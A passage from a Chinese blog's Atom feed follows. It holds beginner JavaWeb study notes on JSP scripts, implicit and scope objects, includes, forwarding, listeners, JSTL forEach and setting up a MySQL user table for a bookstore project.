class="line">&lt;&#x2F;c:forEach&gt;</span><br></pre></td></tr></table></figure><p>创建一个Person类，然后创建List集合，实例化五个Person对象加入集合，然后将List装进request域。最后遍历，变量.属性即可。</p><h4 id="其它属性"><a href="#其它属性" class="headerlink" title="其它属性"></a>其它属性</h4><p>step表示遍历的步长值，比如i++, i+=2这样，2就是步长。</p><p>varStatus: 表示当前遍历的变量的状态。这个有很多用：</p><p><img src="/2021/05/14/JavaWeb%E5%AD%A6%E4%B9%A0-6/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210515131842849.png" alt="image-20210515131842849"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:forEach varStatus&#x3D;&quot;status&quot; begin&#x3D;&quot;1&quot; end&#x3D;&quot;5&quot; step&#x3D;&quot;2&quot;&gt;</span><br><span class="line">    $&#123;status.begin&#125;</span><br><span class="line">    $&#123;status.step&#125;</span><br><span class="line">    $&#123;status.current&#125;</span><br><span class="line">&lt;&#x2F;c:forEach&gt;</span><br></pre></td></tr></table></figure><p>前面说过，EL表达式其实获取的是Getxxx函数（或者isxxx)返回的值，因此看status的方法，比如有getIndex(), 那么EL表达式中使用：<code>${status.index}</code>即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天学习EL表达式和JSTL标签库。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaWeb" scheme="https://ggyggy666.github.io/categories/JavaWeb/"/>
    
    
      <category term="JavaWeb学习" scheme="https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb学习(5)</title>
    <link href="https://ggyggy666.github.io/2021/05/11/JavaWeb%E5%AD%A6%E4%B9%A0-5/"/>
    <id>https://ggyggy666.github.io/2021/05/11/JavaWeb%E5%AD%A6%E4%B9%A0-5/</id>
    <published>2021-05-11T11:52:10.000Z</published>
    <updated>2021-05-13T09:09:23.434Z</updated>
    
    <content type="html"><![CDATA[<p>今天接着学习jsp的内容</p><a id="more"></a><h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><p>JSP页面中可以有三种注释。</p><ul><li>HTML注释：<code>&lt;!-- xxx --&gt;</code>,会被JSP编译器翻译成out.write直接输出到客户端。</li><li>Java代码注释：单行<code>//</code>, 多行<code>/* xx */</code>。会被翻译到Java文件中作为注释，这是因为它需要放到<code>&lt;% xxx %&gt;</code>里面，作为代码部分。</li><li>JSP注释：<code>&lt;%-- xx --%&gt;</code>, 不会输出到客户端源码，也不会翻译到Java文件中它也可以注释掉JSP页面中所有代码。包括其它注释。</li></ul><p>另外注意：HTML注释中，JSP的表达式脚本可以运行。</p><p><img src="https://raw.githubusercontent.com/ggyggy666/ggyggy666.github.io/master/img/image-20210511200639080.png" alt="image-20210511200639080"></p><p><img src="https://raw.githubusercontent.com/ggyggy666/ggyggy666.github.io/master/img/image-20210511200833493.png" alt></p><p>嵌在HTML注释中的JSP表达式脚本被执行了返回ggy，然后作为HTML中的注释被输出。</p><h1 id="九大内置对象"><a href="#九大内置对象" class="headerlink" title="九大内置对象"></a>九大内置对象</h1><ul><li>request：请求对象。</li><li>response：响应对象。</li><li>pageContext: jsp的上下文对象。</li><li>session: 会话对象。</li><li>application：ServletContext对象。</li><li>config：ServletConfig对象。</li><li>out: jsp输出流对象。</li><li>page：指向当前jsp的对象。</li><li>exception: 异常对象。</li></ul><h1 id="四大域对象"><a href="#四大域对象" class="headerlink" title="四大域对象"></a>四大域对象</h1><ul><li>pageContext对象（pageContextimpl类）：有效范围是当前jsp页面。</li><li>request对象（HttpServletRequest类）：一次请求内有效</li><li>session对象（HttpSession类）：一个会话范围内有效。</li><li>application对象（ServletContext类）：整个web工程有效。</li></ul><p>域对象是指可以像Map一样存取数据。</p><p>首先创建一个scope.jsp</p><p><img src="https://i.loli.net/2021/05/11/6L7abYUI9p23jXB.png" alt="image-20210511202900212"></p><p>设置好域对象的数据，然后获取输出到页面，访问scope.jsp即可看到四个数据。接下来一个个测试它们的作用范围。</p><p>首先是pageContext对象，作用范围是当前JSP页面。</p><p>新建一个JSP页面scope2.JSP，其内容是获取四个域对象的数据。</p><p><img src="https://i.loli.net/2021/05/11/EWgmvArP8QF7DkC.png" alt="image-20210511203056738"></p><p>然后在scope.jsp中将请求转发到scope2.jsp。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%     request.getRequestDispatcher(&quot;&#x2F;scope2.jsp&quot;).forward(request, response);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这样，访问scope.jsp的时候会转发请求然后跳到scope2.jsp, scope2.jsp就无法获取到scope.jsp中设置的pageContext域对象数据。</p><p><img src="https://i.loli.net/2021/05/11/oDZKbVn17SOgRwv.png" alt="image-20210511203246438"></p><p>然后是直接访问scope2.jsp，会看到request域对象的数据也是null。</p><p>之后将浏览器关闭，再重新访问scope2.jsp，发现session数据也没了。</p><p>最后重启tomcat，访问scope2.jsp, application数据没了。</p><h1 id="out和response输出"><a href="#out和response输出" class="headerlink" title="out和response输出"></a>out和response输出</h1><p>先看代码</p><p><img src="https://i.loli.net/2021/05/11/7IZjsTM3A9eLUxw.png" alt="image-20210511204011521"></p><p>访问</p><p><img src="https://i.loli.net/2021/05/11/qaoDm4eCfXWlP5i.png" alt="image-20210511204030350"></p><p>发现response的输出比out更靠前了！</p><p>这是因为，out有缓冲区，response也有缓冲区。当页面代码执行完毕后要输出时，会先执行out.flush()操作，将out缓冲区中的内容追加到response缓冲区中，然后再执行response缓冲区的刷新操作输出。</p><p>当然，也可以手动改变输出顺序，可以在out打印之后就执行out.flush()</p><p><img src="https://i.loli.net/2021/05/11/HUA1EYJMlPNj8Gk.png" alt="image-20210511204343889"></p><p>执行输出顺序就变成：test1-&gt;test3-&gt;test4-&gt;test2了。</p><p>由于JSP编译器将JSP代码翻译成java文件时，使用的就是out.write。因此，<strong>为了避免输出顺序乱了，应使用out.write输出</strong></p><h1 id="out和print打印"><a href="#out和print打印" class="headerlink" title="out和print打印"></a>out和print打印</h1><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    out.write(&quot;ggy&quot;);</span><br><span class="line">    out.print(&quot;ggy&quot;);</span><br><span class="line">    </span><br><span class="line">    out.write(&quot;12&quot;);</span><br><span class="line">    out.print(&quot;12&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>结果是两个都能正确打印。因为打印的是字符串。</p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    out.write(12);</span><br><span class="line">    out.print(12);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>打印数字，第一个out.write打印出来奇怪的东西，而out.print正确打印出来了12。</p><p>这是因为：out.write打印字符串没问题，打印数字时，会将数字作为ASCII码，然后将该ASCII码对应的字符输出来。而out.print不管打印什么类型的，都会先将其转换成字符串类型再打印出来。</p><p>因此，最好使用：out.print()打印。</p><h1 id="包含其它jsp文件"><a href="#包含其它jsp文件" class="headerlink" title="包含其它jsp文件"></a>包含其它jsp文件</h1><h2 id="静态包含"><a href="#静态包含" class="headerlink" title="静态包含"></a>静态包含</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ include file&#x3D;&quot;&#x2F;include&#x2F;footer.jsp&quot;%&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;%@ xx %&gt;</code>表示的是指令，比如：<code>&lt;%@ page=xx %&gt;</code>也是。</p><p>静态包含会将其它jsp文件的内容包含进来，相当于在本jsp文件中加入了其它jsp文件里的内容，翻译成Java文件输出。</p><p>被包含的jsp文件不会被翻译成java文件。</p><h2 id="动态包含"><a href="#动态包含" class="headerlink" title="动态包含"></a>动态包含</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page&#x3D;&quot;footer.jsp&quot;&gt;&lt;&#x2F;jsp:include&gt;</span><br></pre></td></tr></table></figure><p>翻译成java文件后</p><p><img src="https://i.loli.net/2021/05/11/P2O3sGXtmW6hQqc.png" alt="image-20210511210029073"></p><p>发现是一行代码，该代码作用：main.jsp动态包含footer.jsp, 那么main.jsp会将request和response，out对象都传给footer.jsp供它使用，那么这两个文件操作的都是同一个域对象，可以共享数据。</p><p><img src="https://i.loli.net/2021/05/11/IlXjJFT8HfYdD1s.png" alt="image-20210511210243654"></p><p>动态包含可以传递数据。</p><p>main.jsp中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page&#x3D;&quot;footer.jsp&quot;&gt;</span><br><span class="line">    &lt;jsp:param name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot;&#x2F;&gt;</span><br><span class="line">    &lt;jsp:param name&#x3D;&quot;password&quot; value&#x3D;&quot;ggy666&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;jsp:include&gt;</span><br></pre></td></tr></table></figure><p>footer.jsp中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%&#x3D;request.getParameter(&quot;username&quot;)%&gt;</span><br><span class="line">&lt;%&#x3D;request.getParameter(&quot;password&quot;)%&gt;</span><br></pre></td></tr></table></figure><p>再访问main.jsp, 然后看到包含进来的footer.jsp输出了root和ggy666。</p><h1 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h1><p>之前的servlet的请求转发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.getRequestDispatcher(&quot;&#x2F;scope2.jsp&quot;).forward(request, response);</span><br></pre></td></tr></table></figure><p>现在JSP的请求转发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:forward page&#x3D;&quot;scope2.jsp&quot;&gt;&lt;&#x2F;jsp:forward&gt;</span><br></pre></td></tr></table></figure><h1 id="Listener监听器"><a href="#Listener监听器" class="headerlink" title="Listener监听器"></a>Listener监听器</h1><p>JavaWeb三大组件：Servlet程序、Filter过滤器和Listener监听器。</p><p>它其实就是个接口，负责监听事件，然后需要我们去实现接口，当触发事件时执行相应的函数。</p><p>有八大监听器。</p><p><strong>ServletContextListener监听器</strong></p><p>主要是用于监听ServletContext对象的创建和销毁。而Web工程创建时会创建ServletContext对象，重新部署运行会销毁。</p><ul><li>contextInitialized(ServletContextEvent sce): 创建</li><li>contextDestroyed(ServletContextEvent sce): 销毁</li></ul><p>新建一个类，然后实现监听器接口</p><p><img src="https://i.loli.net/2021/05/12/AgekWn6FYXI9r4D.png" alt="image-20210512231412306"></p><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h2 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h2><p><img src="https://i.loli.net/2021/05/13/X1vYHtSE42NOUPw.png" alt="image-20210513132509951"></p><p><img src="https://i.loli.net/2021/05/13/TBwLtkdvFes8Z2y.png" alt="image-20210513132523893"></p><h2 id="输出学生信息"><a href="#输出学生信息" class="headerlink" title="输出学生信息"></a>输出学生信息</h2><p>1.首先定义一个学生类，类里面定义学生的属性，然后构造函数初始化，再生成Getter and Setter, 最好再生成一个toString方法将学生属性输出。</p><p><img src="https://i.loli.net/2021/05/13/Mkpt5ZC6iEVxbOJ.png" alt="image-20210513164444178"></p><p>2.使用JSP文件，先是生成10个学生对象并同时对它们进行初始化，然后将对象保存进一个数组中</p><p><img src="https://i.loli.net/2021/05/13/hPxvy5LldciKYCf.png" alt="image-20210513164549105"></p><p>注意，Java的列表使用的是List&lt;&gt;，需要动态new一个空间出来，空间大小则是根据&lt;&gt;里的类型而定。然后列表有add方法，可以直接将内容添加到数组中。</p><p>3.遍历列表中保存的学生对象，将每个对象的属性数据输出</p><p><img src="https://i.loli.net/2021/05/13/6HEmAOCXRjzvqBU.png" alt="image-20210513164814918"></p><p>注意，遍历数组时，for循环可以直接用(Student student: 列表)的形式。稍微加一些css即可</p><p><img src="https://i.loli.net/2021/05/13/aIQGYT7RJDAV1Pu.png" alt="image-20210513164937190"></p><h2 id="JSP与Servlet联动"><a href="#JSP与Servlet联动" class="headerlink" title="JSP与Servlet联动"></a>JSP与Servlet联动</h2><p>Servlet程序在web.xml中部署了访问路径，用户首先可以访问这个servlet路径，发起一个请求。Servlet接收到请求后，获取请求参数，然后将参数拼接到sql语句去查询数据库，得到的数据保存到request中。然后使用<strong>请求转发</strong>的方式，将请求转发到JSP中。由于请求转发的request对象和response对象都不变，JSP中则可以使用request对象访问到Servlet程序保存的数据，并输出到页面。</p><p>1.新建一个Servlet程序，在doGet方法中</p><p><img src="https://i.loli.net/2021/05/13/l34EbVQnhzYLSkj.png" alt="image-20210513170517514"></p><p>2.修改test2.jsp内容，这次不用再生成学生对象了，只需要接收request中的学生对象数组。</p><p><img src="https://i.loli.net/2021/05/13/C3dxHbDvwaBOScJ.png" alt="image-20210513170609627"></p><p>3.配置web.xml, 增加访问Servlet程序的路径</p><p><img src="https://i.loli.net/2021/05/13/n3Da5467qGwL1jY.png" alt="image-20210513170735806"></p><p>一定要重新部署，然后访问student即可</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天接着学习jsp的内容&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaWeb" scheme="https://ggyggy666.github.io/categories/JavaWeb/"/>
    
    
      <category term="JavaWeb学习" scheme="https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb学习(4)</title>
    <link href="https://ggyggy666.github.io/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/"/>
    <id>https://ggyggy666.github.io/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/</id>
    <published>2021-05-07T02:35:27.000Z</published>
    <updated>2021-05-07T03:49:37.990Z</updated>
    
    <content type="html"><![CDATA[<p>今天开始学习jsp。</p><a id="more"></a><p>之前用的Servlet返回数据给页面，如果返回的是一个网页，那么得一行行输出返回，实在麻烦。而Jsp可以像写网页那样直接写网页就行了，方便很多。访问也可以直接访问xxx.jsp即可。</p><h1 id="Jsp本质"><a href="#Jsp本质" class="headerlink" title="Jsp本质"></a>Jsp本质</h1><blockquote><p>当第一次访问Jsp时，tomcat服务器会将jsp文件翻译成一个.class和java源文件。路径是：C:\Users\29924.IntelliJIdea2019.3\system\tomcat\Tomcat_8_5_60_JavaWeb_5\work\Catalina\localhost\Jsp\org\apache\jsp</p></blockquote><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507111104179.png" alt="image-20210507111104179"></p><p>而java源文件里面</p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507104712419.png" alt="image-20210507104712419"></p><p>我创建的是test.jsp, 它则定义了一个test_jsp类，继承了HttpJspBase, 而这个HttpJspBase又是继承了HttpServlet, 因此jsp可以说是HttpServlet的封装。看后面内容</p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507104842063.png" alt="image-20210507104842063"></p><p>这是Jsp的内容，但在这个源文件里，也是像servlet程序那样将内容一行行输出。所以说，我们在jsp文件里输的内容，tomcat服务器会帮我们自动转化成servlet输出返回的形式封装在这个Java源文件里面。我们只需要专心写网页就行，tomcat帮我们做好了输出返回。</p><h1 id="page标签"><a href="#page标签" class="headerlink" title="page标签"></a>page标签</h1><p>注意到jsp文件页面的首部有一个page标签。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br></pre></td></tr></table></figure><p>它可以用来修改页面的属性。属性如下：</p><ul><li>language: jsp翻译后是什么程序的文件，暂时只支持Java，就是上面说的Java源文件。</li><li>contentType: jsp返回的数据类型，text/html返回HTML。</li><li>pageEncoding: 当前jsp页面的字符集编码。</li><li>import: 导入包和类。</li><li>autoFlush：缓冲区满了之后，是否自动刷新缓冲区。默认是true。</li><li>buffer: 缓冲区的大小，默认是8kb. </li><li>errorPage: 出错后重定向到哪个错误页面。</li><li>isErrorPage: 当前页面是否是错误页面。默认是false，如果是true可以获取异常信息。</li><li>session: 访问当前jsp页面时，是否创建HttpSession对象，默认是true。</li><li>extends: 将jsp翻译出来的java源文件里的java类默认继承谁。</li></ul><h1 id="声明脚本"><a href="#声明脚本" class="headerlink" title="声明脚本"></a>声明脚本</h1><p>可以在JSP页面声明属性、方法、静态代码块和内部类等。使用<code>&lt;%! %&gt;</code>即可。</p><p><strong>声明属性</strong></p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507111306247.png" alt="image-20210507111306247"></p><p>再访问一下jsp，然后看java源文件</p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507111407853.png" alt="image-20210507111407853"></p><p>可以发现定义的东西一模一样的输出到了Java源文件里面。</p><p><strong>声明静态代码块</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static&#123;</span><br><span class="line">map &#x3D; new HashMap&lt;String, Object&gt;();</span><br><span class="line">map.put(&quot;key1&quot;, &quot;value1&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>声明方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public int abc()&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>声明内部类</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static class A &#123;</span><br><span class="line">private Integer id &#x3D; 12;</span><br><span class="line">private String name &#x3D; &quot;ggy&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将它们放在JSP文件里面，使用<code>&lt;%!  %&gt;</code>即可。</p><h1 id="表达式脚本"><a href="#表达式脚本" class="headerlink" title="表达式脚本"></a>表达式脚本</h1><p>表达式脚本可以在JSP页面上输出数据。使用：<code>&lt;%=表达式 %&gt;</code></p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507112628332.png" alt="image-20210507112628332"></p><p>注意map对象，静态代码块里面实例化的，定义的时候也需要static。访问JSP页面</p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507112730378.png" alt="image-20210507112730378"></p><p>查看JAVA源文件</p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507112807810.png" alt="image-20210507112807810"></p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507112841286.png" alt="image-20210507112841286"></p><p>都是直接调用out.print打印的。</p><p><strong>特点</strong></p><ul><li>所有的表达式脚本都是输出到jspService方法中的，因此jspService()中的对象、方法等在表达式脚本里边都可以调用。</li><li>表达式脚本都会被翻译成out.print打印输出到页面。</li><li>表达式脚本中的表达式不能以分号结束。</li></ul><p><strong>调用jspService的request对象</strong></p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507113239941.png" alt="image-20210507113239941"></p><p>访问：</p><p><a href="http://localhost:8080/Jsp/test.jsp?username=ggy" target="_blank" rel="noopener">http://localhost:8080/Jsp/test.jsp?username=ggy</a></p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507113324651.png" alt="image-20210507113324651"></p><p><strong>如果表达式以分号结束</strong></p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507113550637.png" alt="image-20210507113550637"></p><p>访问JSP页面，报错了，查看Java源文件</p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507113634840.png" alt="image-20210507113634840"></p><p>很明显看到错误。因为表达式都是在out.print里面的，就是参数传进print函数，没有分号。</p><h1 id="代码脚本"><a href="#代码脚本" class="headerlink" title="代码脚本"></a>代码脚本</h1><p>就是写Java代码，格式：<code>&lt;% %&gt;</code></p><p><strong>if语句</strong></p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507114211766.png" alt="image-20210507114211766"></p><p>如果是i==1可以，如果是if(i)会报错。在Java源文件里面</p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507114249298.png" alt="image-20210507114249298"></p><p>原样输出。同样是在jspService方法里面，也可以调用request对象等。<strong>可以用分号！</strong></p><p>重点是循环，与Jsp嵌套</p><p><strong>for循环</strong></p><p>for循环可以被jsp语句隔开，并不会影响它的完整性。</p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507114745832.png" alt="image-20210507114745832"></p><p>其实跟PHP那种写法一样的。访问jsp</p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507114754963.png" alt="image-20210507114754963"></p><p>刚开始很难理解，但是去看Java源文件后</p><p><img src="/2021/05/07/JavaWeb%E5%AD%A6%E4%B9%A0-4/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210507114831000.png" alt="image-20210507114831000"></p><p>要时刻记住，jsp的html语句会被翻译成out.write(xxx)，这样的效果就是循环打印了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天开始学习jsp。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaWeb" scheme="https://ggyggy666.github.io/categories/JavaWeb/"/>
    
    
      <category term="JavaWeb学习" scheme="https://ggyggy666.github.io/tags/JavaWeb%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb学习(3)</title>
    <link href="https://ggyggy666.github.io/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/"/>
    <id>https://ggyggy666.github.io/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/</id>
    <published>2021-05-04T05:00:32.000Z</published>
    <updated>2021-05-07T02:39:57.243Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习书城项目的功能的编写。</p><a id="more"></a><h1 id="JavaEE三层架构"><a href="#JavaEE三层架构" class="headerlink" title="JavaEE三层架构"></a>JavaEE三层架构</h1><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504130148345.png" alt="image-20210504130148345"></p><p>客户端发送请求给服务端，服务端有三层，首先是Web层，负责封装请求，然后调用业务层的service处理业务；接着是业务层，负责处理业务请求，然后调用数据库进行存储；最后是持久层，负责与数据库进行交互。当然，这还得有个数据库才行。最后web层响应数据给客户端。</p><p>因此，一个完整的前后端项目需要的包为：</p><table><thead><tr><th>web层</th><th>com.JavaWeb.web/servlet/controller</th><th></th></tr></thead><tbody><tr><td>service层</td><td>com.JavaWeb.service</td><td>service接口包</td></tr><tr><td>service层</td><td>com.JavaWeb.service.impl</td><td>service接口实现包</td></tr><tr><td>dao持久层</td><td>com.JavaWeb.dao</td><td>dao接口包</td></tr><tr><td>dao持久层</td><td>com.JavaWeb.dao.impl</td><td>dao接口实现类</td></tr><tr><td>实体bean对象</td><td>com.JavaWeb.pojo/entity/domain/bean</td><td>JavaBean类</td></tr><tr><td>测试包</td><td>com.JavaWeb.test/unit</td><td></td></tr><tr><td>工具类</td><td>com.JavaWeb.utils</td><td></td></tr></tbody></table><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504132236612.png" alt="image-20210504132236612"></p><p>注意：在com.JavaWeb上新建package后得到service包，然后在service包上新建package得到service.impl包。最后只显示了service.impl包。</p><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>需要先搭建好数据库并进行操作。</p><h2 id="MySQL创建数据库和表"><a href="#MySQL创建数据库和表" class="headerlink" title="MySQL创建数据库和表"></a>MySQL创建数据库和表</h2><p>首先打开PHP Study的MySQL数据库，然后在PHP Study的设置中</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504150559284.png" alt="image-20210504150559284"></p><p>图中是Mysql8.0的，但是最后使用的是5.7。打开MySql的安装目录，进入到bin目录下，可以发现存在mysql.exe。因此将此时所在目录添加到环境变量。然后命令行中：<code>mysql -uroot -p</code>, 输入密码即可连接到数据库。</p><p>创建book数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create database book;</span><br><span class="line">use book;</span><br></pre></td></tr></table></figure><p>创建表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table user(</span><br><span class="line">    &#96;id&#96; int primary key auto_increment,</span><br><span class="line">    &#96;username&#96; varchar(20) not null unique,</span><br><span class="line">    &#96;password&#96; varchar(32) not null,</span><br><span class="line">    &#96;email&#96; varchar(200));</span><br></pre></td></tr></table></figure><p>插入数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into user(&#96;username&#96;,&#96;password&#96;,&#96;email&#96;) values (&#39;admin&#39;,&#39;ggy666&#39;,&#39;123@qq.com&#39;);</span><br></pre></td></tr></table></figure><p>查看数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user;</span><br></pre></td></tr></table></figure><h2 id="编写数据库表对应的JavaBean对象"><a href="#编写数据库表对应的JavaBean对象" class="headerlink" title="编写数据库表对应的JavaBean对象"></a>编写数据库表对应的JavaBean对象</h2><p>Bean对象在pojo包下创建。创建一个类User，对应数据库的user表。</p><p><img src="/2021/05/04/JavaWeb%E5%AD%A6%E4%B9%A0-3/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210504152536441.png" alt="image-20210504152536441"></p><p>首先编写4个变量，然后右键点击Generate，点击Getter and Setter, 就会生成get和set的方法。继续右键单击Generate，点击toString方法，然后是一个空的Constructor, 最后是4个变量的Constructor。</p><h2 id="编写工具类获取数据库连接和关闭"><a href="#编写工具类获取数据库连接和关闭" class="headerlink" title="编写工具类获取数据库连接和关闭"></a>编写工具类获取数据库连接和关闭</h2><p>工具类包是Utils，在其下新建一个类JdbcUtils</p><p><img 